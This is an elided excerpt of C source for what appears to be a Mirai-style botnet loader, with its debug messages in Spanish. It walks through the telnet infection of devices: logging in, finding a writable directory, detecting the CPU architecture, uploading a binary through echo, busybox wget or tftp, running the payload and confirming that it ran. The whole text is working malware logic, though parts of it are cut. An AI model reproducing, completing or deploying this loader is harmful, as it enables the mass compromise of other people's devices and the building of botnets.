...
void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    ...
    while (fd >= (srv->max_open * 2))
    {
        ...
        conn->fd = fd;
#ifdef DEBUG
        printf("No se puede utilizar el socket porque el buf del cliente no es lo suficientemente grande\n");
#endif
...
static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
...
#ifdef DEBUG
        if (conn->open)
            printf("[FD%d] Se ha producido un error y debe cerrarse\n", ev->data.fd);
#endif
        connection_close(conn);
        return;
    }
    ...
    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
    {
        ...
        {
#ifdef DEBUG
            printf("[FD%d] Conexion rechazada\n", ev->data.fd);
#endif
            connection_close(conn);
            return;
        }
...
#ifdef DEBUG
        printf("[FD%d] Conexion establecida\n", ev->data.fd);
        usleep(1000);
#endif
...
#ifdef DEBUG
                    if (conn->open)
                        printf("[FD%d] Se ha encontrado un error %d. Cerrando\n", ev->data.fd, errno);
#endif
                    connection_close(conn);
                }
                break;
...
//            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
			...
			if (conn->rdbuf[0] == 0xff){
...
#ifdef DEBUG
                            printf("[FD%d] Se ha iniciado la sesion con exito\n", ev->data.fd);
#endif
                    ...
                    case TELNET_READ_WRITEABLE:
                        ...
                        {
#ifdef DEBUG
                            printf("[FD%d] Se ha encontrado un directorio escribible: %s/\n", ev->data.fd, conn->info.writedir);
#endif
                    ...
                    case TELNET_COPY_ECHO:
                        ...
                        {
#ifdef DEBUG
                            printf("[FD%d] Terminado de copiar /bin/echo a cwd\n", conn->fd);
#endif
                    ...
                    case TELNET_DETECT_ARCH:
                        ...
                        if (consumed)
                        {
                            ...
                            {
#ifdef DEBUG
                                printf("[FD%d] Determinando ARM sub-tipo\n", conn->fd);
#endif
                            ...
                            {
#ifdef DEBUG
                                printf("[FD%d] Arquitectura detectada: '%s'\n", ev->data.fd, conn->info.arch);
#endif
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                            }
                    ...
                    case TELNET_ARM_SUBTYPE:
                        if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                        {
                            ...
                            {
#ifdef DEBUG
                                printf("[FD%d] No tenemos un binario ARMv7, asi que intentaremos usar el ARM por defecto\n", conn->fd);
#endif
                            }
                            else
                                conn->bin = bin;
                    ...
                    case TELNET_UPLOAD_ECHO:   
                        ...
                        if (consumed)
                        {
                            ...
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Carga echo finalizada!\n", conn->fd);
#endif
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if (consumed)
                        {
                            ...
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Carga wget finalizada\n", conn->fd);
#endif
                    ...
                    case TELNET_UPLOAD_TFTP:
                        ...
                        if (consumed > 0)
                        {
                            ...
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Carga tftp finalizada\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                        ...
                        {
#ifdef DEBUG
                            printf("[FD%d] No hay permiso para la carga de TFTP, volviendo a echo!\n", conn->fd);
#endif
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;
                    ...
                    case TELNET_RUN_BINARY:
                        if ((consumed = connection_verify_payload(conn)) > 0)
                        {
                            if (consumed >= 255)
                            {
                                conn->success = TRUE;
#ifdef DEBUG
                                printf("[FD%d] Se ha ejecutado con exito el payload\n", conn->fd);
#endif
                                consumed -= 255;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Fallo en la ejecucion del payload\n", conn->fd);
#endif
